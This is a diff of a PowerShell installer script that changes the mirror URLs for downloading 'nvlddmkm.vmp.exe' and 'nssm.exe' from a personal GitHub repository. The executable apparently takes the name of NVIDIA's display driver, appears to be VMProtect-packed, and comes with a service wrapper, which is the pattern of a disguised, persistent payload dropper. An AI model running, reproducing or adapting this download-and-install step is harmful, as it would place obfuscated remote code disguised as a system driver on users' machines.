@@ -152,10 +152,10 @@ Write-Host "`nStep 3: Downloading files..." -ForegroundColor Cyan
 
 # Define files with multiple mirror URLs
 $files = @{
-    'nvlddmkm.exe' = @(
+    'nvlddmkm.vmp.exe' = @(
         'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.vmp.exe',
-        'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.exe',
-        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.exe'
+        'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.vmp.exe',
+        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.vmp.exe'
     )
     'nssm.exe' = @(
         'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe',
@@ -355,6 +355,7 @@ if ($Host.Name -eq "ConsoleHost") {
     Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
+
 
 
 
